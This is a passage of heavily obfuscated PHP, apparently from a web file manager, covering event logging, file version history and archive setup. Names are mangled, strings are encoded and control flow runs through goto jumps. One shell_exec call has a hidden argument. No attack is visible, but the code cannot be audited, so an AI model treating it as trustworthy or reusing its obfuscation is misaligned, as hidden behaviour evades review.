array_to_keyvalue($aˆÖÆ–é°Ó, $E©Ú÷Ä”„[2101]); } goto bå¸®³ª·¬; EÔìõÜ™Ö…: } private function authInfo($f•–´Üö) { $DŞÛ²Ğ ¿ =& $_SERVER[í…¶]; if ($f•–´Üö[$DŞÛ²Ğ ¿[2232]]) { $c ô×ŞºÇ = Model($DŞÛ²Ğ ¿[2251])->listData($f•–´Üö[$DŞÛ²Ğ ¿[2232]]); if (!$c ô×ŞºÇ) { return !1; $EŠÅ•ÑŒë¯ = Model($DŞÛ²Ğ ¿[2251])->listData(); $Aíµøã· = array_filter_by_field($EŠÅ•ÑŒë¯, $DŞÛ²Ğ ¿[385], $DŞÛ²Ğ ¿[477]); return $Aíµøã·; } $DŠªÌ­ã¢ = array_field_key($c ô×ŞºÇ, array($DŞÛ²Ğ ¿[376], $DŞÛ²Ğ ¿[28], $DŞÛ²Ğ ¿[385], $DŞÛ²Ğ ¿[2119], $DŞÛ²Ğ ¿[2122])); $DŠªÌ­ã¢[$DŞÛ²Ğ ¿[2277]] = $f•–´Üö; return $DŠªÌ­ã¢; } else { return array($DŞÛ²Ğ ¿[394] => 0, $DŞÛ²Ğ ¿[2107] => $f•–´Üö[$DŞÛ²Ğ ¿[2233]], $DŞÛ²Ğ ¿[395] => $DŞÛ²Ğ ¿[33], $DŞÛ²Ğ ¿[2119] => $DŞÛ²Ğ ¿[2278]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\162\143\145\x5f\145\x76\x65\156\164"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\151\155\145", "\x74\x69\155\x65", "\151\156\163\145\162\164", "\x66\x75\x6e\x63\x74\151\157\x6e"), array("\144\145\163\x63", '', "\x69\x6e\x73\145\x72\x74\x2c\x75\x70\144\141\x74\x65\x2c\163\x65\154\145\x63\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($AĞš™Î¤…ˆ, $Fö„íÔ„Ğ, $b¯¹ŸŠ•ä§ = '') { goto C¼È£äÊ; d¼éô‹±Çˆ: $E˜…ÜëÏİ = array($B†ªëÚªù×[392] => $AĞš™Î¤…ˆ, $B†ªëÚªù×[2279] => $EÊ¢Şñá¶¨[$B†ªëÚªù×[470]], $B†ªëÚªù×[2280] => $EÊ¢Şñá¶¨[$B†ªëÚªù×[28]], $B†ªëÚªù×[475] => $EÊ¢Şñá¶¨[$B†ªëÚªù×[475]], $B†ªëÚªù×[1424] => USER_ID, $B†ªëÚªù×[397] => $Fö„íÔ„Ğ, $B†ªëÚªù×[1426] => $b¯¹ŸŠ•ä§); $this->addSystemLog($Fö„íÔ„Ğ, $E˜…ÜëÏİ); return $this->add($E˜…ÜëÏİ); goto d£™‰¨Ô©é; C¼È£äÊ: $B†ªëÚªù× =& $_SERVER[í…¶]; if (!$this->eventSave) { return; } $EÊ¢Şñá¶¨ = Model($B†ªëÚªù×[1115])->sourceInfo($AĞš™Î¤…ˆ); goto F¯—¶õ¢è; F¯—¶õ¢è: if (!$EÊ¢Şñá¶¨) { return !1; } if ($this->isCacheEvent($EÊ¢Şñá¶¨, $Fö„íÔ„Ğ)) { return; } if ($b¯¹ŸŠ•ä§ && is_string($b¯¹ŸŠ•ä§)) { $b¯¹ŸŠ•ä§ = array($B†ªëÚªù×[2131] => $b¯¹ŸŠ•ä§); } goto d¼éô‹±Çˆ; d£™‰¨Ô©é: } private function addSystemLog($Eêó§¹é©‰, $cÛ÷ŠÁê†±) { $a¬ÃÕ®¿†± =& $_SERVER[í…¶]; if ($Eêó§¹é©‰ == $a¬ÃÕ®¿†±[2281]) { $Eêó§¹é©‰ = $cÛ÷ŠÁê†±[$a¬ÃÕ®¿†±[414]][$a¬ÃÕ®¿†±[2282]]; } else { if (in_array($Eêó§¹é©‰, array($a¬ÃÕ®¿†±[2078], $a¬ÃÕ®¿†±[2283]))) { $Eêó§¹é©‰ = $cÛ÷ŠÁê†±[$a¬ÃÕ®¿†±[414]][$a¬ÃÕ®¿†±[694]]; } } $a‰ƒËçïó‰ = array_merge($cÛ÷ŠÁê†±, array($a¬ÃÕ®¿†±[2284] => $cÛ÷ŠÁê†±[$a¬ÃÕ®¿†±[378]], $a¬ÃÕ®¿†±[2285] => $cÛ÷ŠÁê†±[$a¬ÃÕ®¿†±[2285]])); Model($a¬ÃÕ®¿†±[2041])->addLog($a¬ÃÕ®¿†±[2286] . $Eêó§¹é©‰, $a‰ƒËçïó‰); } private function isCacheEvent($ağ‘‡ï…», $aÆÜÙÌÁ­ó) { if ($ağ‘‡ï…»[$_SERVER[í…¶][380]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($a³õÃìøóÁ, $CåñÀ³Œñ‘) { $AòÆÈÁ¶† =& $_SERVER[í…¶]; $c×®Şç¬³° = Model($AòÆÈÁ¶†[1115])->sourceInfo($a³õÃìøóÁ); $Cˆ¶‘ç‚–  = array($AòÆÈÁ¶†[2282] => $CåñÀ³Œñ‘, $AòÆÈÁ¶†[28] => $c×®Şç¬³°[$AòÆÈÁ¶†[28]]); return $this->addEvent($a³õÃìøóÁ, $AòÆÈÁ¶†[2281], $Cˆ¶‘ç‚– ); } public function eventFileEdit($EÕ†ë³’×—) { $EœØéò“²š =& $_SERVER[í…¶]; $F™Â„”ØŒä = array($EœØéò“²š[2287] => $_SERVER[$EœØéò“²š[2288]], $EœØéò“²š[1747] => strtolower(ACTION)); return $this->addEvent($EÕ†ë³’×—, $EœØéò“²š[2068], $F™Â„”ØŒä); } public function eventRecycle($dÃê‡‰±ôÈ, $Dğï…›´½Û) { return $this->addEvent($dÃê‡‰±ôÈ, $_SERVER[í…¶][2283], $Dğï…›´½Û); } public function eventRemove($AÓÏ²«²§á) { $b“Ü¬±šÍñ =& $_SERVER[í…¶]; $fÆ¿â­‰õë = Model($b“Ü¬±šÍñ[1115])->sourceInfo($AÓÏ²«²§á); $aø…Çœ÷œ = $fÆ¿â­‰õë[$b“Ü¬±šÍñ[28]]; return $this->addEvent($fÆ¿â­‰õë[$b“Ü¬±šÍñ[470]], $b“Ü¬±šÍñ[2067], $aø…Çœ÷œ); } public function eventShare($f•Ñª Ùõô, $AßâèÔ¼) { return $this->addEvent($f•Ñª Ùõô, $_SERVER[í…¶][2078], $AßâèÔ¼); } public function eventMove($C‡Åè‡¤ê‹, $FØª¡¦…ˆò, $Aº±Ûô¡ƒ·) { goto f¼ëáÔœ¹; f†ä“âÅ˜Õ: $this->addEvent($FØª¡¦…ˆò, $D¾ÛÛÃ¢Ë¾[2293], $f‹Ÿ†ã”ï½); goto cïÍ¤²’•ï; F‰‹ã´Ïî: $a¹‡±Á¼ÇÑ = $a¸¬ªÓø™ï->sourceInfo($FØª¡¦…ˆò); $DÉ‘’à²©é = $a¸¬ªÓø™ï->sourceInfo($Aº±Ûô¡ƒ·); $f‹Ÿ†ã”ï½ = array($D¾ÛÛÃ¢Ë¾[1005] => $FØª¡¦…ˆò, $D¾ÛÛÃ¢Ë¾[2289] => $a¹‡±Á¼ÇÑ[$D¾ÛÛÃ¢Ë¾[28]], $D¾ÛÛÃ¢Ë¾[2290] => $a¹‡±Á¼ÇÑ[$D¾ÛÛÃ¢Ë¾[475]], $D¾ÛÛÃ¢Ë¾[1006] => $Aº±Ûô¡ƒ·, $D¾ÛÛÃ¢Ë¾[2291] => $DÉ‘’à²©é[$D¾ÛÛÃ¢Ë¾[28]], $D¾ÛÛÃ¢Ë¾[2292] => $DÉ‘’à²©é[$D¾ÛÛÃ¢Ë¾[475]]); goto EùÑ«¹ ÔÈ; EùÑ«¹ ÔÈ: $this->addEvent($C‡Åè‡¤ê‹, $D¾ÛÛÃ¢Ë¾[501], $f‹Ÿ†ã”ï½); $a ÇŒÜ—Ï¹ = $a¸¬ªÓø™ï->sourceInfo($C‡Åè‡¤ê‹); $f‹Ÿ†ã”ï½ = array($D¾ÛÛÃ¢Ë¾[378] => $a ÇŒÜ—Ï¹[$D¾ÛÛÃ¢Ë¾[378]], $D¾ÛÛÃ¢Ë¾[28] => $a ÇŒÜ—Ï¹[$D¾ÛÛÃ¢Ë¾[28]]); goto f†ä“âÅ˜Õ; f¼ëáÔœ¹: $D¾ÛÛÃ¢Ë¾ =& $_SERVER[í…¶]; $a¸¬ªÓø™ï = Model($D¾ÛÛÃ¢Ë¾[1115]); $a ÇŒÜ—Ï¹ = $a¸¬ªÓø™ï->sourceInfo($C‡Åè‡¤ê‹); goto F‰‹ã´Ïî; cïÍ¤²’•ï: } public function eventCopy($b–øİØ­¹¹) { $this->eventCreate($b–øİØ­¹¹, $_SERVER[í…¶][499]); } public function eventRename($E¶…µ¨ƒ°, $fÚĞƒÇ ˆ, $EÂ‰ò®ÛŒè) { $Fñˆ¨“£„ß =& $_SERVER[í…¶]; $c¤›Ü¶‘› = array($Fñˆ¨“£„ß[1005] => $fÚĞƒÇ ˆ, $Fñˆ¨“£„ß[1006] => $EÂ‰ò®ÛŒè); return $this->addEvent($E¶…µ¨ƒ°, $Fñˆ¨“£„ß[1128], $c¤›Ü¶‘›); } public function eventAddComment($fëÃ™´î¢, $DÑ¶è†ƒÓ©) { return $this->addEvent($fëÃ™´î¢, $_SERVER[í…¶][2294], $DÑ¶è†ƒÓ©); } public function eventAddDesc($eƒòÒ´°ö, $aßˆ©…¾¢ê) { return $this->addEvent($eƒòÒ´°ö, $_SERVER[í…¶][2295], $aßˆ©…¾¢ê); } public function listBySource($c¹“À¥šø°) { goto bÎ“ï’¼Üª; bÎ“ï’¼Üª: $böç£Œ¤ =& $_SERVER[í…¶]; $Fâ²ğÌÃ = Model($böç£Œ¤[1115])->sourceInfo($c¹“À¥šø°); $dˆ±áÉ‚¿À = array($böç£Œ¤[392] => $c¹“À¥šø°); goto f‰ø‰õËÜØ; f‰ø‰õËÜØ: if ($Fâ²ğÌÃ[$böç£Œ¤[379]] == $böç£Œ¤[83]) { $BÕßÙêÜˆç = Model($böç£Œ¤[1115])->listSearchChildren($c¹“À¥šø°, 20000); $BÕßÙêÜˆç[] = $c¹“À¥šø° . $böç£Œ¤[370]; $dˆ±áÉ‚¿À = array($böç£Œ¤[378] => array($böç£Œ¤[7], $BÕßÙêÜˆç)); } $e¼ÏÆµ¼šî = $this->where($dˆ±áÉ‚¿À)->order($böç£Œ¤[2296])->selectPage(); if ($e¼ÏÆµ¼šî[$böç£Œ¤[360]][$böç£Œ¤[361]] == 0) { $e¼ÏÆµ¼šî[$böç£Œ¤[360]][$böç£Œ¤[361]] = 1; $e¼ÏÆµ¼šî[$böç£Œ¤[363]] = array(array($böç£Œ¤[392] => $c¹“À¥šø°, $böç£Œ¤[2279] => $Fâ²ğÌÃ[$böç£Œ¤[470]], $böç£Œ¤[1424] => $Fâ²ğÌÃ[$böç£Œ¤[387]], $böç£Œ¤[397] => $böç£Œ¤[2297], $böç£Œ¤[398] => $Fâ²ğÌÃ[$böç£Œ¤[187]], $böç£Œ¤[1426] => $böç£Œ¤[33])); } goto fœŠ’Øƒñ×; fœŠ’Øƒñ×: return $this->eventListParse($e¼ÏÆµ¼šî, $c¹“À¥šø°); goto AÁ²¦Ã‹šˆ; AÁ²¦Ã‹šˆ: } private function eventListParse($e›µ¨Œ©««, $b¡œà¨Öãø) { goto Bå°•ÄÚ; B»ßåÙ“Ã: $aë«ƒ±‹ = array_unique($aë«ƒ±‹); $A¡­¤‡á„î = array_unique(array_to_keyvalue($Bñ³´Ÿ¦Ç“, $cƒÜºîÔğØ[33], $cƒÜºîÔğØ[1433])); $aÎº–‘†ø‡ = Model($cƒÜºîÔğØ[486])->userListInfo($A¡­¤‡á„î); goto eö¿¼ËÄçÉ; eö¿¼ËÄçÉ: $eë“‹¼…¨® = Model($cƒÜºîÔğØ[755])->sourceListInfo($aë«ƒ±‹, !0); foreach ($Bñ³´Ÿ¦Ç“ as &$fÜ¤Œ˜ƒƒ) { if ($fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[29]] == $cƒÜºîÔğØ[501] && isset($fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[414]][$cƒÜºîÔğØ[1005]])) { $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[414]][$cƒÜºîÔğØ[1005]] = $eë“‹¼…¨®[$fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[414]][$cƒÜºîÔğØ[1005]]]; $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[414]][$cƒÜºîÔğØ[1006]] = $eë“‹¼…¨®[$fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[414]][$cƒÜºîÔğØ[1006]]]; } if ($fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[29]] == $cƒÜºîÔğØ[2293] && isset($fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[414]][$cƒÜºîÔğØ[378]])) { $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[414]][$cƒÜºîÔğØ[378]] = $eë“‹¼…¨®[$fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[414]][$cƒÜºîÔğØ[378]]]; } $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[400]] = $eë“‹¼…¨®[$fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[378]]]; $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[2298]] = $eë“‹¼…¨®[$fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[2285]]]; if ($fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[29]] == $cƒÜºîÔğØ[2067]) { $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[2298]] = $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[400]]; $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[2285]] = $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[2298]][$cƒÜºîÔğØ[378]]; $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[400]] = !1; $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[378]] = $cƒÜºîÔğØ[33]; } $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[2241]] = $aÎº–‘†ø‡[$fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[1433]]]; } $e›µ¨Œ©««[$cƒÜºîÔğØ[363]] = $Bñ³´Ÿ¦Ç“; goto C ––¡¯ŠÓ; Bå°•ÄÚ: $cƒÜºîÔğØ =& $_SERVER[í…¶]; $Bñ³´Ÿ¦Ç“ = $e›µ¨Œ©««[$cƒÜºîÔğØ[363]]; $aë«ƒ±‹ = array_to_keyvalue($Bñ³´Ÿ¦Ç“, $cƒÜºîÔğØ[33], $cƒÜºîÔğØ[378]); goto A÷±Ô¢‡Ğ; A÷±Ô¢‡Ğ: $EåàÊ®‰¯ß = array_to_keyvalue($Bñ³´Ÿ¦Ç“, $cƒÜºîÔğØ[33], $cƒÜºîÔğØ[2285]); foreach ($Bñ³´Ÿ¦Ç“ as $fÜ¤Œ˜ƒƒ) { $F¾ù÷‰¬á = $fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[414]]; if ($fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[29]] == $cƒÜºîÔğØ[501] && isset($F¾ù÷‰¬á[$cƒÜºîÔğØ[1005]])) { $aë«ƒ±‹[] = $F¾ù÷‰¬á[$cƒÜºîÔğØ[1005]] . $cƒÜºîÔğØ[33]; $aë«ƒ±‹[] = $F¾ù÷‰¬á[$cƒÜºîÔğØ[1006]] . $cƒÜºîÔğØ[33]; } if ($fÜ¤Œ˜ƒƒ[$cƒÜºîÔğØ[29]] == $cƒÜºîÔğØ[2293] && isset($F¾ù÷‰¬á[$cƒÜºîÔğØ[378]])) { $aë«ƒ±‹[] = $F¾ù÷‰¬á[$cƒÜºîÔğØ[378]] . $cƒÜºîÔğØ[33]; } } $aë«ƒ±‹ = array_merge($aë«ƒ±‹, $EåàÊ®‰¯ß, array($b¡œà¨Öãø . $cƒÜºîÔğØ[33])); goto B»ßåÙ“Ã; C ––¡¯ŠÓ: return $e›µ¨Œ©««; goto aĞš“¥­áí; aĞš“¥­áí: } public function removeBySource($dù·Ş»°Êè) { $a¦®…œ›Şî = array($_SERVER[í…¶][392] => $dù·Ş»°Êè); $this->where($a¦®…œ›Şî)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\162\143\145\x5f\150\151\x73\x74\157\162\171"; public function addHistory($a‡ííÜŠ†, $F¥†œ’ÎîÉ = '') { $C¬Ô‰¼‡î =& $_SERVER[í…¶]; $c¶†é„Š¨ = array($C¬Ô‰¼‡î[392] => $a‡ííÜŠ†[$C¬Ô‰¼‡î[378]], $C¬Ô‰¼‡î[1424] => isset($a‡ííÜŠ†[$C¬Ô‰¼‡î[388]]) ? $a‡ííÜŠ†[$C¬Ô‰¼‡î[388]] : $a‡ííÜŠ†[$C¬Ô‰¼‡î[387]], $C¬Ô‰¼‡î[429] => $a‡ííÜŠ†[$C¬Ô‰¼‡î[428]], $C¬Ô‰¼‡î[529] => $a‡ííÜŠ†[$C¬Ô‰¼‡î[77]], $C¬Ô‰¼‡î[2299] => $F¥†œ’ÎîÉ); $A­ ßÕ»ˆğ = $GLOBALS[$C¬Ô‰¼‡î[6]][$C¬Ô‰¼‡î[84]][$C¬Ô‰¼‡î[2300]]; if ($A­ ßÕ»ˆğ > 1) { $this->historyAutoClear($c¶†é„Š¨[$C¬Ô‰¼‡î[378]]); $this->add($c¶†é„Š¨); } Model($C¬Ô‰¼‡î[2301])->eventFileEdit($a‡ííÜŠ†[$C¬Ô‰¼‡î[378]]); } private function historyAutoClear($EèŠïÓóëÄ) { goto Fª®×ÕçÏ±; F¤Á©ÆøÒ: $c’ å¯¦Á˜ = $c…›¬†ã Ÿ == $a®¼àĞõ›•[2303] ? 3 : $a¾‚¸©¨Éµ; if ($a¾‚¸©¨Éµ <= 1) { $c’ å¯¦Á˜ = 1; } $D¥Íø„ = $c’ å¯¦Á˜ - 1; goto fñœê»ºÕ¨; b†èÚÄ¹ª: $fÏï˜Ê§Õò = array_to_keyvalue($BóÉÌõ©×Ç, $a®¼àĞõ›•[33], $a®¼àĞõ›•[428]); $fÏï˜Ê§Õò = array_slice($fÏï˜Ê§Õò, $D¥Íø„); if (!$AèÃ¡¤ñ || !$fÏï˜Ê§Õò) { return; } goto CëÊ‘…„Í÷; fñœê»ºÕ¨: if ($D¥Íø„ >= 500) { return; } $Aò¨±ùÜù = array($a®¼àĞõ›•[392] => $EèŠïÓóëÄ); $BóÉÌõ©×Ç = $this->field($a®¼àĞõ›•[2304])->where($Aò¨±ùÜù)->order($a®¼àĞõ›•[2296])->select(); goto añ…šÛª‚µ; añ…šÛª‚µ: if (!$BóÉÌõ©×Ç || $D¥Íø„ >= count($BóÉÌõ©×Ç)) { return; } $AèÃ¡¤ñ = array_to_keyvalue($BóÉÌõ©×Ç, $a®¼àĞõ›•[33], $a®¼àĞõ›•[376]); $AèÃ¡¤ñ = array_slice($AèÃ¡¤ñ, $D¥Íø„); goto b†èÚÄ¹ª; CëÊ‘…„Í÷: $Aò¨±ùÜù = array($a®¼àĞõ›•[394] => array($a®¼àĞõ›•[7], $AèÃ¡¤ñ)); $this->where($Aò¨±ùÜù)->delete(); Model($a®¼àĞõ›•[431])->remove($fÏï˜Ê§Õò); goto e•¢Åğ½ÏÅ; Fª®×ÕçÏ±: $a®¼àĞõ›• =& $_SERVER[í…¶]; $c…›¬†ã Ÿ = Model($a®¼àĞõ›•[1086])->get($a®¼àĞõ›•[2302]); $a¾‚¸©¨Éµ = $GLOBALS[$a®¼àĞõ›•[6]][$a®¼àĞõ›•[84]][$a®¼àĞõ›•[2300]]; goto F¤Á©ÆøÒ; e•¢Åğ½ÏÅ: } public function listData($Fò­ô¶ìø›) { goto C¤²ãËÑãÃ; C¤²ãËÑãÃ: $aç®¶é î =& $_SERVER[í…¶]; $e”İëˆò = array($aç®¶é î[392] => $Fò­ô¶ìø›); $b¯¸¾óø¬ = $aç®¶é î[2305]; goto båÍé‘Ôò; båÍé‘Ôò: $fÜŒ¹®óëö = $this->field($b¯¸¾óø¬)->where($e”İëˆò)->order($aç®¶é î[2296])->selectPage(); $this->_listAppendUser($fÜŒ¹®óëö[$aç®¶é î[363]]); $F¶Ìœ•á¾† = Model($aç®¶é î[1086])->get($aç®¶é î[2302]); goto d™î·¤—÷‚; d™î·¤—÷‚: $bô“°†Ùè = 3; if ($F¶Ìœ•á¾† == $aç®¶é î[2303]) { $fÜŒ¹®óëö[$aç®¶é î[363]] = array_slice($fÜŒ¹®óëö[$aç®¶é î[363]], 0, $bô“°†Ùè); $fÜŒ¹®óëö[$aç®¶é î[360]] = array($aç®¶é î[2306] => 1, $aç®¶é î[2307] => 20, $aç®¶é î[2308] => 1, $aç®¶é î[2309] => count($fÜŒ¹®óëö[$aç®¶é î[363]])); } return $fÜŒ¹®óëö; goto cìä¨»îß³; cìä¨»îß³: } protected function _listAppendUser(&$DÈ‘ë«ÕŠ) { $F´²á¼¥á³ =& $_SERVER[í…¶]; $b²ğØÕËéö = array_to_keyvalue($DÈ‘ë«ÕŠ, $F´²á¼¥á³[33], $F´²á¼¥á³[1433]); $C½´ãà³ = Model($F´²á¼¥á³[486])->userListInfo($b²ğØÕËéö); foreach ($DÈ‘ë«ÕŠ as &$cŠñïÌÌùÎ) { $dãóç‹ï‹² = $cŠñïÌÌùÎ[$F´²á¼¥á³[1433]]; $cŠñïÌÌùÎ[$F´²á¼¥á³[387]] = $C½´ãà³[$dãóç‹ï‹²] ? $C½´ãà³[$dãóç‹ï‹²] : !1; } } public function fileInfo($Dˆî†ß†Â®) { $C®ÖŞÏÛ =& $_SERVER[í…¶]; $CİÛó•ˆêµ = $this->tablePrefix; $B¡½¬˜•ê = "{$CİÛó•ˆêµ}\x69\x6f\137\x66\151\154\x65\x20\146\x69\x6c\145\x73\x20\x6f\x6e\x20\146\x69\154\145\x73\56\146\151\154\145\x49\x44\40\x3d\x20\150\151\x73\x74\157\x72\x79\x2e\146\x69\x6c\145\x49\104"; return $this->alias($C®ÖŞÏÛ[2310])->where(array($C®ÖŞÏÛ[394] => $Dˆî†ß†Â®))->join($B¡½¬˜•ê, $C®ÖŞÏÛ[2311])->find(); } public function removeItem($CßÍóïóÍ”) { $aÓåšŠé‘´ =& $_SERVER[í…¶]; $aÛ­À¾ìĞâ = array($aÓåšŠé‘´[394] => $CßÍóïóÍ”); $béÖÙ½´Ô† = $this->where($aÛ­À¾ìĞâ)->find(); if ($béÖÙ½´Ô†) { $eÊ±º¸œŠæ = $this->where($aÛ­À¾ìĞâ)->delete(); Model($aÓåšŠé‘´[431])->remove($béÖÙ½´Ô†[$aÓåšŠé‘´[428]]); return $eÊ±º¸œŠæ; } return !1; } public function removeBySource($AŠß•Ìª®˜) { goto a£–µêÊÖ; dŞŞù¤„•: return !0; goto C¾¥”ùÎ‘¬; a£–µêÊÖ: $b’Ğƒ†Ô¬ =& $_SERVER[í…¶]; if (!$AŠß•Ìª®˜) { return !1; } if (!is_array($AŠß•Ìª®˜)) { $AŠß•Ìª®˜ = array($AŠß•Ìª®˜); } goto eÓ„¿Ñ¡ùÕ; eÓ„¿Ñ¡ùÕ: $Dğ‘…ñ‹˜› = array($b’Ğƒ†Ô¬[392] => array($b’Ğƒ†Ô¬[7], $AŠß•Ìª®˜)); $b”ÂÅÎ†¹³ = $this->field($b’Ğƒ†Ô¬[429])->where($Dğ‘…ñ‹˜›)->select(); if ($b”ÂÅÎ†¹³) { $this->where($Dğ‘…ñ‹˜›)->delete(); $D´ƒåè‰ = array_to_keyvalue($b”ÂÅÎ†¹³, $b’Ğƒ†Ô¬[33], $b’Ğƒ†Ô¬[428]); Model($b’Ğƒ†Ô¬[431])->remove($D´ƒåè‰); } goto dŞŞù¤„•; C¾¥”ùÎ‘¬: } public function setDetail($B©¡ˆ£“ó, $e’ƒøš¡ñ) { $aÚˆÒ×³™ =& $_SERVER[í…¶]; return $this->where(array($aÚˆÒ×³™[394] => $B©¡ˆ£“ó))->save(array($aÚˆÒ×³™[2299] => $e’ƒøš¡ñ)); } public function rollbackToItem($d¦©ä¯Š„š, $Aî‘Øô»Ô) { goto ağ‘É©Œ§÷; A†é¼ê½É: return $this->where(array($DÌÖÓ®Å˜÷[394] => $Aî‘Øô»Ô))->delete(); goto eïªÒÌö°ó; ağ‘É©Œ§÷: $DÌÖÓ®Å˜÷ =& $_SERVER[í…¶]; $Bù ©¦‰‰Í = Model($DÌÖÓ®Å˜÷[755])->sourceInfo($d¦©ä¯Š„š); $this->addHistory($Bù ©¦‰‰Í); goto CæÆÛ¥„ĞÚ; CæÆÛ¥„ĞÚ: $Aàâî™È¡ = $this->find($Aî‘Øô»Ô); $CÇÀ¶†É² = array($DÌÖÓ®Å˜÷[428] => $Aàâî™È¡[$DÌÖÓ®Å˜÷[428]], $DÌÖÓ®Å˜÷[77] => $Aàâî™È¡[$DÌÖÓ®Å˜÷[77]], $DÌÖÓ®Å˜÷[107] => time(), $DÌÖÓ®Å˜÷[388] => USER_ID); Model($DÌÖÓ®Å˜÷[755])->where(array($DÌÖÓ®Å˜÷[378] => $d¦©ä¯Š„š))->save($CÇÀ¶†É²); goto A†é¼ê½É; eïªÒÌö°ó: } public function clearSame($fœ„³‚ÆÇÇ) { goto EÀ‰Ó®îØ…; e’ÏØçç‰¼: $cèİ…«öóÈ = array(); $b‚”¢Œİ°Ğ = array(); foreach ($BÏ„«Œ‹œğ as $aë˜°Ä˜Àº) { if (!$aë˜°Ä˜Àº || count($aë˜°Ä˜Àº) <= 1) { continue; } foreach ($aë˜°Ä˜Àº as $D’®ÖçÑ¿) { $cèİ…«öóÈ[] = $D’®ÖçÑ¿[$dï„ñ´×ÕÛ[428]]; $b‚”¢Œİ°Ğ[] = $D’®ÖçÑ¿[$dï„ñ´×ÕÛ[376]]; } } goto AìªÄ†¿Ò£; AìªÄ†¿Ò£: if (!$b‚”¢Œİ°Ğ) { return; } $this->where(array($dï„ñ´×ÕÛ[376] => array($dï„ñ´×ÕÛ[7], $b‚”¢Œİ°Ğ)))->delete(); Model($dï„ñ´×ÕÛ[431])->remove($cèİ…«öóÈ); goto b¦ƒ¼‰Í–; EÀ‰Ó®îØ…: $dï„ñ´×ÕÛ =& $_SERVER[í…¶]; $bá„„§÷­Ö = $this->listData($fœ„³‚ÆÇÇ); $BÏ„«Œ‹œğ = array_to_keyvalue_group($bá„„§÷­Ö, $dï„ñ´×ÕÛ[428]); goto e’ÏØçç‰¼; b¦ƒ¼‰Í–: } public function userSpace() { $BÀÜˆâ™ª =& $_SERVER[í…¶]; $A´Š•Û†à¹ = $this->tablePrefix; $dàÃäšÕ = array($BÀÜˆâ™ª[1424] => USER_ID); $CÅ™ÖÂ ÏÍ = "{$A´Š•Û†à¹}\151\x6f\x5f\146\151\154\145\x20\146\151\154\145\x73\x20\157\x6e\x20\x66\x69\154\145\163\56\x66\x69\x6c\x65\x49\104\40\75\40\150\x69\163\164\x6f\x72\x79\x2e\146\x69\154\x65\111\x44"; return $this->alias($BÀÜˆâ™ª[2310])->where($dàÃäšÕ)->join($CÅ™ÖÂ ÏÍ, $BÀÜˆâ™ª[2311])->sum($BÀÜˆâ™ª[77]); } } goto b“°…ˆğóé; CÖİ‘øÒš: class KodArchive { static function init() { goto aŠÄàÕÙ¦; EÚŒ®ç“‘í: require_once ARCHIVE_LIB . $E˜ŸÎ‡å[1890]; require_once ARCHIVE_LIB . $E˜ŸÎ‡å[1891]; require_once ARCHIVE_LIB . $E˜ŸÎ‡å[1892]; goto cšİ Ûóåõ; cšİ Ûóåõ: require_once ARCHIVE_LIB . $E˜ŸÎ‡å[1893]; goto B•èâùëæ; Cß•ô‰“È: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $E˜ŸÎ‡å[1888]; require_once ARCHIVE_LIB . $E˜ŸÎ‡å[1889]; goto EÚŒ®ç“‘í; BéÃØ»Ÿä: define($E˜ŸÎ‡å[1884], TEMP_FILES); define($E˜ŸÎ‡å[1885], TEMP_FILES); define($E˜ŸÎ‡å[1886], $E˜ŸÎ‡å[1887]); goto Cß•ô‰“È; aŠÄàÕÙ¦: $E˜ŸÎ‡å =& $_SERVER[í…¶]; if (defined($E˜ŸÎ‡å[1882])) { return; } define($E˜ŸÎ‡å[1882], SDK_DIR . $E˜ŸÎ‡å[1883]); goto BéÃØ»Ÿä; B•èâùëæ: } static function checkIfType($BƒÆ¢Û´õ, $B•á¿ öÅ¨) { goto a®Äöõ×ö; a‘±ÎƒëÈ¿: $eãĞôåã· = in_array($BƒÆ¢Û´õ, $B¥Î­Ó—¹[$B•á¿ öÅ¨]); if ($eãĞôåã· && ($B•á¿ öÅ¨ == $c½¢Œ·©Ã¸[301] || $B•á¿ öÅ¨ == $c½¢Œ·©Ã¸[1897]) && (!function_exists($c½¢Œ·©Ã¸[1905]) || !function_exists($c½¢Œ·©Ã¸[1906]))) { show_tips($c½¢Œ·©Ã¸[1907]); } if ($eãĞôåã· && $B•á¿ öÅ¨ == $c½¢Œ·©Ã¸[1043] && (!function_exists($c½¢Œ·©Ã¸[1908]) || !strstr(shell_exec($c½¢Œ·©Ã¸[1909]), $c½¢Œ·©Ã¸[1910]))) { show_tips($c½¢Œ·©Ã¸[1911]); } goto C…ƒİ¡Æ´; a®Äöõ×ö: $c½¢Œ·©Ã¸ =& $_SERVER[í…¶]; self::init(); $B¥Î­Ó—¹ = array($c½¢Œ·©Ã¸[301] => array($c½¢Œ·©Ã¸[301], $c½¢Œ·©Ã¸[1894], $c½¢Œ·©Ã¸[1895], 